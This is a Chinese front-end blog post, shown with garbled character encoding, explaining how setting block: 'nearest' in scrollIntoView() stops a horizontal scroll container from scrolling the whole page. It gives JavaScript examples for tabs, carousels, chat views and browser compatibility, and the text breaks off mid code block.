tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>ä»Šå¤©åœ¨å¼€å‘ä¸­é‡åˆ°äº†ä¸€ä¸ªå…¸å‹çš„æ»šåŠ¨é—®é¢˜ï¼šåœ¨ä¸€ä¸ªæ¨ªå‘æ»šåŠ¨çš„å®¹å™¨ä¸­ï¼Œå½“å­å…ƒç´ è°ƒç”¨ <code>scrollIntoView()</code> æ–¹æ³•æ—¶ï¼Œæ„å¤–è§¦å‘äº†æ•´ä¸ªé¡µé¢çš„ <code>body</code> æ»šåŠ¨ï¼Œè€Œä¸æ˜¯æˆ‘ä»¬æœŸæœ›çš„å®¹å™¨å†…éƒ¨æ»šåŠ¨ã€‚</p>
<p>ç»è¿‡è°ƒè¯•ï¼Œæˆ‘å‘ç°äº†ä¸€ä¸ªç®€å•å´é²œä¸ºäººçŸ¥çš„è§£å†³æ–¹æ¡ˆï¼Œä»Šå¤©åˆ†äº«ç»™å¤§å®¶ã€‚</p>
<h2 data-id="heading-1">é—®é¢˜é‡ç°</h2>
<h3 data-id="heading-2">åœºæ™¯æè¿°</h3>
<p>æˆ‘ä»¬æœ‰ä¸€ä¸ªæ¨ªå‘æ»šåŠ¨çš„äº§å“åˆ—è¡¨ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"product-scroll-container"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"product-list"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"product-item"</span>&gt;</span>äº§å“1<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"product-item"</span>&gt;</span>äº§å“2<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"product-item"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"target-product"</span>&gt;</span>ç›®æ ‡äº§å“<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- æ›´å¤šäº§å“é¡¹ --&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>å¯¹åº”çš„ CSSï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.product-scroll-container</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">200px</span>;
  <span class="hljs-attribute">overflow-x</span>: auto;
  <span class="hljs-attribute">overflow-y</span>: hidden;
  <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#e0e0e0</span>;
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">8px</span>;
}

<span class="hljs-selector-class">.product-list</span> {
  <span class="hljs-attribute">display</span>: flex;
  <span class="hljs-attribute">gap</span>: <span class="hljs-number">16px</span>;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">16px</span>;
  <span class="hljs-attribute">width</span>: max-content;
}

<span class="hljs-selector-class">.product-item</span> {
  <span class="hljs-attribute">min-width</span>: <span class="hljs-number">200px</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">160px</span>;
  <span class="hljs-attribute">background</span>: <span class="hljs-number">#f5f5f5</span>;
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">8px</span>;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">16px</span>;
}
</code></pre>
<h3 data-id="heading-3">é—®é¢˜ä»£ç </h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æœŸæœ›ï¼šåœ¨å®¹å™¨å†…æ¨ªå‘æ»šåŠ¨åˆ°ç›®æ ‡äº§å“</span>
<span class="hljs-comment">// å®é™…ï¼šæ•´ä¸ªé¡µé¢å‘ç”Ÿæ»šåŠ¨</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'target-product'</span>).<span class="hljs-title function_">scrollIntoView</span>({
  <span class="hljs-attr">behavior</span>: <span class="hljs-string">'smooth'</span>
});
</code></pre>
<h2 data-id="heading-4">é—®é¢˜åˆ†æ</h2>
<h3 data-id="heading-5">ä¸ºä»€ä¹ˆä¼šè§¦å‘ body æ»šåŠ¨ï¼Ÿ</h3>
<ol>
<li>
<p><strong>é»˜è®¤å‚æ•°é™·é˜±</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// é»˜è®¤è¡Œä¸ºç­‰ä»·äº</span>
element.<span class="hljs-title function_">scrollIntoView</span>({
  <span class="hljs-attr">block</span>: <span class="hljs-string">'start'</span>,    <span class="hljs-comment">// é»˜è®¤å€¼</span>
  <span class="hljs-attr">inline</span>: <span class="hljs-string">'nearest'</span>  <span class="hljs-comment">// é»˜è®¤å€¼</span>
});
</code></pre>
</li>
<li>
<p><strong>æµè§ˆå™¨æ»šåŠ¨é€»è¾‘</strong>ï¼š</p>
<ul>
<li>å½“ <code>block: 'start'</code> æ—¶ï¼Œæµè§ˆå™¨ä¼šå°è¯•è®©å…ƒç´ çš„<strong>é¡¶éƒ¨</strong>å¯¹é½æ»šåŠ¨å®¹å™¨çš„é¡¶éƒ¨</li>
<li>å¦‚æœå®¹å™¨é«˜åº¦ä¸è¶³æˆ–å…ƒç´ ä½ç½®ç‰¹æ®Šï¼Œæµè§ˆå™¨å¯èƒ½ä¼šé€‰æ‹©æ›´å¤–å±‚çš„æ»šåŠ¨å®¹å™¨</li>
<li>æœ€ç»ˆå¯èƒ½è§¦å‘ <code>body</code> æˆ– <code>html</code> å…ƒç´ çš„æ»šåŠ¨</li>
</ul>
</li>
<li>
<p><strong>å®¹å™¨é«˜åº¦å½±å“</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å®¹å™¨é«˜åº¦ï¼š200px</span>
<span class="hljs-comment">// å…ƒç´ é«˜åº¦ï¼š160px + padding</span>
<span class="hljs-comment">// å½“å°è¯• 'start' å¯¹é½æ—¶ï¼Œå¯èƒ½éœ€è¦é¢å¤–çš„å‚ç›´è°ƒæ•´</span>
</code></pre>
</li>
</ol>
<h2 data-id="heading-6">è§£å†³æ–¹æ¡ˆï¼šç¥å¥‡çš„ <code>block: 'nearest'</code></h2>
<h3 data-id="heading-7">ä¸€è¡Œä»£ç è§£å†³é—®é¢˜</h3>
<pre><code class="hljs language-javascript" lang="javascript">targetElement.<span class="hljs-title function_">scrollIntoView</span>({
  <span class="hljs-attr">behavior</span>: <span class="hljs-string">'smooth'</span>,
  <span class="hljs-attr">block</span>: <span class="hljs-string">'nearest'</span>,     <span class="hljs-comment">// å…³é”®å˜åŒ–ï¼</span>
  <span class="hljs-attr">inline</span>: <span class="hljs-string">'center'</span>      <span class="hljs-comment">// æ°´å¹³æ–¹å‘å±…ä¸­</span>
});
</code></pre>
<h3 data-id="heading-8">ä¸ºä»€ä¹ˆ <code>nearest</code> èƒ½è§£å†³é—®é¢˜ï¼Ÿ</h3>
<p><code>block: 'nearest'</code> çš„è¡Œä¸ºé€»è¾‘ï¼š</p>
<ol>
<li><strong>æ™ºèƒ½åˆ¤æ–­</strong>ï¼šæ£€æŸ¥å…ƒç´ ç›¸å¯¹äºè§†å£çš„ä½ç½®</li>
<li><strong>æœ€å°æ»šåŠ¨</strong>ï¼šé€‰æ‹©éœ€è¦æ»šåŠ¨æœ€å°‘çš„å¯¹é½æ–¹å¼</li>
<li><strong>é¿å…å†²çª</strong>ï¼šå¦‚æœå…ƒç´ å·²ç»åœ¨å‚ç›´æ–¹å‘ä¸Šå¯è§ï¼Œå°±ä¸æ»šåŠ¨</li>
</ol>
<p>å¯¹äºæ¨ªå‘æ»šåŠ¨å®¹å™¨ï¼š</p>
<ul>
<li>å‚ç›´æ–¹å‘ï¼šä¿æŒç°çŠ¶ï¼ˆä¸è§¦å‘ä¸å¿…è¦çš„æ»šåŠ¨ï¼‰</li>
<li>æ°´å¹³æ–¹å‘ï¼šæŒ‰æŒ‡å®šæ–¹å¼å¯¹é½ï¼ˆå¦‚ <code>center</code>ï¼‰</li>
</ul>
<h3 data-id="heading-9">å„ç§å¯¹é½æ–¹å¼å¯¹æ¯”</h3>



































<table><thead><tr><th>å‚æ•°</th><th>è¡Œä¸º</th><th>æ¨ªå‘æ»šåŠ¨åœºæ™¯</th><th>æ˜¯å¦æ¨è</th></tr></thead><tbody><tr><td><code>block: 'start'</code></td><td>é¡¶éƒ¨å¯¹é½</td><td>âŒ å¯èƒ½è§¦å‘bodyæ»šåŠ¨</td><td>ä¸æ¨è</td></tr><tr><td><code>block: 'center'</code></td><td>å‚ç›´å±…ä¸­</td><td>âŒ å¯èƒ½è§¦å‘bodyæ»šåŠ¨</td><td>ä¸æ¨è</td></tr><tr><td><code>block: 'end'</code></td><td>åº•éƒ¨å¯¹é½</td><td>âŒ å¯èƒ½è§¦å‘bodyæ»šåŠ¨</td><td>ä¸æ¨è</td></tr><tr><td><code>block: 'nearest'</code></td><td>æœ€è¿‘å¯¹é½</td><td>âœ… åªæ»šåŠ¨å¿…è¦æ–¹å‘</td><td><strong>æ¨è</strong></td></tr></tbody></table>
<h2 data-id="heading-10">å®é™…åº”ç”¨ç¤ºä¾‹</h2>
<h3 data-id="heading-11">åœºæ™¯ä¸€ï¼šTab åˆ‡æ¢ç»„ä»¶</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">TabComponent</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">container</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">container</span> = container;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">tabs</span> = container.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'.tab-item'</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">init</span>();
  }
  
  <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">tabs</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">tab</span> =&gt;</span> {
      tab.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">scrollToTab</span>(tab));
    });
  }
  
  <span class="hljs-title function_">scrollToTab</span>(<span class="hljs-params">tab</span>) {
    <span class="hljs-comment">// æ—§æ–¹å¼ï¼šå¯èƒ½å¯¼è‡´é¡µé¢è·³åŠ¨</span>
    <span class="hljs-comment">// tab.scrollIntoView({ behavior: 'smooth', inline: 'center' });</span>
    
    <span class="hljs-comment">// æ–°æ–¹å¼ï¼šå¹³ç¨³æ»šåŠ¨</span>
    tab.<span class="hljs-title function_">scrollIntoView</span>({
      <span class="hljs-attr">behavior</span>: <span class="hljs-string">'smooth'</span>,
      <span class="hljs-attr">block</span>: <span class="hljs-string">'nearest'</span>,    <span class="hljs-comment">// é¿å…å‚ç›´è·³åŠ¨</span>
      <span class="hljs-attr">inline</span>: <span class="hljs-string">'center'</span>     <span class="hljs-comment">// æ°´å¹³å±…ä¸­</span>
    });
  }
}
</code></pre>
<h3 data-id="heading-12">åœºæ™¯äºŒï¼šå›¾ç‰‡è½®æ’­æŒ‡ç¤ºå™¨</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Carousel</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">slides</span> = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'.slide'</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">dots</span> = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'.dot'</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentIndex</span> = <span class="hljs-number">0</span>;
  }
  
  <span class="hljs-title function_">goToSlide</span>(<span class="hljs-params">index</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentIndex</span> = index;
    <span class="hljs-keyword">const</span> slide = <span class="hljs-variable language_">this</span>.<span class="hljs-property">slides</span>[index];
    
    <span class="hljs-comment">// å¹³æ»‘æ»šåŠ¨åˆ°æŒ‡å®šå¹»ç¯ç‰‡</span>
    slide.<span class="hljs-title function_">scrollIntoView</span>({
      <span class="hljs-attr">behavior</span>: <span class="hljs-string">'smooth'</span>,
      <span class="hljs-attr">block</span>: <span class="hljs-string">'nearest'</span>,      <span class="hljs-comment">// é‡è¦ï¼šä¿æŒå‚ç›´ä½ç½®</span>
      <span class="hljs-attr">inline</span>: <span class="hljs-string">'center'</span>       <span class="hljs-comment">// æ°´å¹³å±…ä¸­æ˜¾ç¤º</span>
    });
    
    <span class="hljs-comment">// æ›´æ–°æŒ‡ç¤ºå™¨çŠ¶æ€</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">updateDots</span>();
  }
  
  <span class="hljs-title function_">updateDots</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">dots</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">dot, i</span>) =&gt;</span> {
      dot.<span class="hljs-property">classList</span>.<span class="hljs-title function_">toggle</span>(<span class="hljs-string">'active'</span>, i === <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentIndex</span>);
    });
  }
}
</code></pre>
<h3 data-id="heading-13">åœºæ™¯ä¸‰ï¼šèŠå¤©æ¶ˆæ¯æ»šåŠ¨</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ChatUI</span> {
  <span class="hljs-title function_">scrollToLatestMessage</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> messages = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'.message'</span>);
    <span class="hljs-keyword">const</span> lastMessage = messages[messages.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>];
    
    <span class="hljs-keyword">if</span> (lastMessage) {
      lastMessage.<span class="hljs-title function_">scrollIntoView</span>({
        <span class="hljs-attr">behavior</span>: <span class="hljs-string">'smooth'</span>,
        <span class="hljs-attr">block</span>: <span class="hljs-string">'nearest'</span>,    <span class="hljs-comment">// é¿å…é¡µé¢æ•´ä½“æ»šåŠ¨</span>
        <span class="hljs-attr">inline</span>: <span class="hljs-string">'nearest'</span>
      });
    }
  }
  
  <span class="hljs-title function_">scrollToMessage</span>(<span class="hljs-params">messageId</span>) {
    <span class="hljs-keyword">const</span> message = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(messageId);
    <span class="hljs-keyword">if</span> (message) {
      <span class="hljs-comment">// å…ˆç¡®ä¿æ¶ˆæ¯å¯è§</span>
      message.<span class="hljs-property">style</span>.<span class="hljs-property">opacity</span> = <span class="hljs-string">'1'</span>;
      
      message.<span class="hljs-title function_">scrollIntoView</span>({
        <span class="hljs-attr">behavior</span>: <span class="hljs-string">'smooth'</span>,
        <span class="hljs-attr">block</span>: <span class="hljs-string">'nearest'</span>,
        <span class="hljs-attr">inline</span>: <span class="hljs-string">'nearest'</span>
      });
      
      <span class="hljs-comment">// é«˜äº®æ•ˆæœ</span>
      message.<span class="hljs-property">style</span>.<span class="hljs-property">backgroundColor</span> = <span class="hljs-string">'#fff9c4'</span>;
      <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
        message.<span class="hljs-property">style</span>.<span class="hljs-property">backgroundColor</span> = <span class="hljs-string">''</span>;
      }, <span class="hljs-number">2000</span>);
    }
  }
}
</code></pre>
<h2 data-id="heading-14">å…¼å®¹æ€§å¤„ç†</h2>
<h3 data-id="heading-15">æµè§ˆå™¨å…¼å®¹æ€§ç°çŠ¶</h3>
<p>å¥½æ¶ˆæ¯æ˜¯ï¼Œ<code>scrollIntoView</code> çš„åŸºæœ¬åŠŸèƒ½åœ¨å„ä¸ªç°ä»£æµè§ˆå™¨ä¸­éƒ½æœ‰å¾ˆå¥½çš„æ”¯æŒï¼š</p>
<ul>
<li>âœ… Chrome 1+</li>
<li>âœ… Firefox 1+</li>
<li>âœ… Safari 1+</li>
<li>âœ… Edge 12+</li>
<li>âœ… Opera 12.1+</li>
</ul>
<p>ä½†æ˜¯ï¼Œå‚æ•°å¯¹è±¡çš„æ”¯æŒæƒ…å†µæœ‰æ‰€ä¸åŒï¼š</p>

































<table><thead><tr><th>ç‰¹æ€§</th><th>Chrome</th><th>Firefox</th><th>Safari</th><th>Edge</th></tr></thead><tbody><tr><td><code>behavior: 'smooth'</code></td><td>61+</td><td>36+</td><td>ä¸æ”¯æŒ</td><td>79+</td></tr><tr><td><code>block</code> å‚æ•°</td><td>å…¨éƒ¨æ”¯æŒ</td><td>å…¨éƒ¨æ”¯æŒ</td><td>å…¨éƒ¨æ”¯æŒ</td><td>å…¨éƒ¨æ”¯æŒ</td></tr><tr><td><code>inline</code> å‚æ•°</td><td>å…¨éƒ¨æ”¯æŒ</td><td>å…¨éƒ¨æ”¯æŒ</td><td>å…¨éƒ¨æ”¯æŒ</td><td>å…¨éƒ¨æ”¯æŒ</td></tr></tbody></table>
<h3 data-id="heading-16">å¹³æ»‘æ»šåŠ¨çš„ polyfill</h3>
<p>å¯¹äºä¸æ”¯æŒ <code>behavior: 'smooth'</code> çš„æµè§ˆå™¨ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">smoothScrollIntoView</span>(<span class="hljs-params">element, options = {}</span>) {
  <span class="hljs-keyword">const</span> defaultOptions = {
    <span class="hljs-attr">block</span>: <span class="hljs-string">'nearest'</span>,
    <span class="hljs-attr">inline</span>: <span class="hljs-string">'center'</span>,
    ...options
  };
  
  <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æ”¯æŒå¹³æ»‘æ»šåŠ¨</span>
  <span class="hljs-keyword">const</span> supportsSmooth = <span class="hljs-string">'scrollBehavior'</span> <span class="hljs-keyword">in</span> <span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-property">style</span>;
  
  <span class="hljs-keyword">if</span> (supportsSmooth &amp;&amp; <span class="hljs-keyword">typeof</span> element.<span class="hljs-property">scrollIntoView</span> === <span class="hljs-string">'function'</span>) {
    <span class="hljs-comment">// ä½¿ç”¨åŸç”Ÿå¹³æ»‘æ»šåŠ¨</span>
    element.<span class="hljs-title function_">scrollIntoView</span>({
      <span class="hljs-attr">behavior</span>: <span class="hljs-string">'smooth'</span>,
      <span class="hljs-attr">block</span>: defaultOptions.<span class="hljs-property">block</span>,
      <span class="hljs-attr">inline</span>: defaultOptions.<span class="hljs-property">inline</span>
    });
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-comment">// é™çº§æ–¹æ¡ˆï¼šä½¿ç”¨ CSS æˆ– JS åŠ¨ç”»</span>
    element.<span class="hljs-title function_">scrollIntoView</span>({
      <span class="hljs-attr">block</span>: defaultOptions.<span class="hljs-property">block</span>,
      <span class="hljs-attr">inline</span>: defaultOptions.<span class="hljs-property">inline</span>
    });
  }
}

<span class="hljs-comment">// ä½¿ç”¨ CSS å¹³æ»‘æ»šåŠ¨çš„é™çº§æ–¹æ¡ˆ</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">addSmoothScrollPolyfill</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">if</span> (!(<span class="hljs-string">'scrollBehavior'</span> <span class="hljs-keyword">in</span> <span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-property">style</span>)) {
    <span class="hljs-keyword">const</span> style = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'style'</span>);
    style.<span class="hljs-property">textContent</span> = <span class="hljs-string">`
      html {
        scroll-behavior: smooth;
      }
    `</span>;
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">head</span>.<span class="hljs-title function_">appendChild</span>(style);
  }
}
</code></pre>
<h2 data-id="heading-17">é«˜çº§æŠ€å·§å’Œæœ€ä½³å®è·µ</h2>
<h3 data-id="heading-18">1. <strong>ç»“åˆ Intersection Observer</strong></h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SmartScroller</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">observer</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">IntersectionObserver</span>(
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">onIntersection</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>),
      { <span class="hljs-attr">threshold</span>: <span class="hljs-number">0.5</span> }
    );
  }
  
  <span class="hljs-title function_">scrollToElement</span>(<span class="hljs-params">element</span>) {
    <span class="hljs-comment">// å…ˆè§‚å¯Ÿå…ƒç´ æ˜¯å¦åœ¨è§†å£ä¸­</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">observer</span>.<span class="hljs-title function_">observe</span>(element);
    
    <span class="hljs-comment">// æ‰§è¡Œæ»šåŠ¨</span>
    element.<span class="hljs-title function_">scrollIntoView</span>({
      <span class="hljs-attr">behavior</span>: <span class="hljs-string">'smooth'</span>,
      <span class="hljs-attr">block</span>: <span class="hljs-string">'nearest'</span>,
      <span class="hljs-attr">inline</span>: <span class="hljs-string">'center'</span>
    });
    
    <span class="hljs-comment">// 3ç§’ååœæ­¢è§‚å¯Ÿ</span>
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">observer</span>.<span class="hljs-title function_">unobserve</span>(element);
    }, <span class="hljs-number">3000</span>);
  }
  
  <span class="hljs-title function_">onIntersection</span>(<span class="hljs-params">entries</span>) {
    entries.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">entry</span> =&gt;</span> {
      <span class="hljs-keyword">if</span> (entry.<span class="hljs-property">isIntersecting</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å…ƒç´ å·²è¿›å…¥è§†å£'</span>);
        <span class="hljs-comment">// å¯ä»¥åœ¨è¿™é‡Œè§¦å‘å…¶ä»–åŠ¨ç”»æˆ–æ•ˆæœ</span>
      }
    });
  }
}
</code></pre>
<h3 data-id="heading-19">2. <strong>æ€§èƒ½ä¼˜åŒ–ï¼šé˜²æŠ–å¤„ç†</strong></h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">createDebouncedScroll</span>(<span class="hljs-params">delay = <span class="hljs-number">150</span></span>) {
  <span class="hljs-keyword">let</span> timeoutId = <span class="hljs-literal">null</span>;
  
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">element, options = {}</span>) {
    <span class="hljs-keyword">if</span> (timeoutId) {
      <span class="hljs-built_in">clearTimeout</span>(timeoutId);
    }
    
    timeoutId = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      element.<span class="hljs-title function_">scrollIntoView</span>({
        <span class="hljs-attr">behavior</span>: <span class="hljs-string">'smooth'</span>,
        <span class="hljs-attr">block</span>: <span class="hljs-string">'nearest'</span>,
        <span class="hljs-attr">inline</span>: options.<span class="hljs-property">inline</span> || <span class="hljs-string">'center'</span>,
        ...options
      });
      timeoutId = <span class="hljs-literal">null</span>;
    }, delay);
  };
}

<span class="hljs-comment">// ä½¿ç”¨</span>
<span class="hljs-keyword">const</span> debouncedScroll = <span class="hljs-title function_">createDebouncedScroll</span>();
<span class="hljs-keyword">const</span> button = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'scroll-button'</span>);
button.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">debouncedScroll</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'target-element'</span>));
});
</code></pre>
<h3 data-id="heading-20">3. <strong>å¯è®¿é—®æ€§è€ƒè™‘</strong></h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">accessibleScrollTo</span>(<span class="hljs-params">element, options = {}</span>) {
  <span class="hljs-keyword">const</span> defaultOptions = {
    <span class="hljs-attr">behavior</span>: <span class="hljs-string">'smooth'</span>,
    <span class="hljs-attr">block</span>: <span class="hljs-string">'nearest'</span>,
    <span class="hljs-attr">inline</span>: <span class="hljs-string">'center'</span>,
    <span class="hljs-attr">focus</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// æ˜¯å¦èšç„¦åˆ°å…ƒç´ </span>
    <span class="hljs-attr">announce</span>: <span class="hljs-literal">true</span> <span class="hljs-comment">// æ˜¯å¦å±å¹•é˜…è¯»å™¨æ’­æŠ¥</span>
  };
  
  <span class="hljs-keyword">const</span> config = { ...defaultOptions, ...options };
  
  <span class="hljs-comment">// æ‰§è¡Œæ»šåŠ¨</span>
  element.<span class="hljs-title function_">scrollIntoView</span>({
    <span class="hljs-attr">behavior</span>: config.<span class="hljs-property">behavior</span>,
    <span class="hljs-attr">block</span>: config.<span class="hljs-property">block</span>,
    <span class="hljs-attr">inline</span>: config.<span class="hljs-property">inline</span>
  });
  
  <span class="hljs-comment">// å¯è®¿é—®æ€§å¢å¼º</span>
  <span class="hljs-keyword">if</span> (config.<span class="hljs-property">focus</span>) {
    element.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">'tabindex'</span>, <span class="hljs-string">'-1'</span>);
    element.<span class="hljs-title function_">focus</span>();
    
    <span class="hljs-comment">// ç§»é™¤ tabindex é¿å…å½±å“æ­£å¸¸ tab é¡ºåº</span>
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      element.<span class="hljs-title function_">removeAttribute</span>(<span class="hljs-string">'tabindex'</span>);
    }, <span class="hljs-number">100</span>);
  }
  
  <span class="hljs-keyword">if</span> (config.<span class="hljs-property">announce</span> &amp;&amp; <span class="hljs-string">'liveRegion'</span> <span class="hljs-keyword">in</span> <span class="hljs-variable language_">this</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">announceToScreenReader</span>(<span class="hljs-string">`å·²æ»šåŠ¨åˆ° <span class="hljs-subst">${element.textContent}</span>`</span>);
  }
}
</code></pre>
<h2 data-id="heading-21">å¸¸è§é—®é¢˜è§£ç­”</h2>
<h3 data-id="heading-22">Q1ï¼šä¸ºä»€ä¹ˆæœ‰æ—¶å€™è¿˜æ˜¯ä¼šæœ‰è½»å¾®è·³åŠ¨ï¼Ÿ</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å¯èƒ½çš„è§£å†³æ–¹æ¡ˆï¼šæ·»åŠ  CSS çº¦æŸ</span>
.<span class="hljs-property">scroll</span>-container {
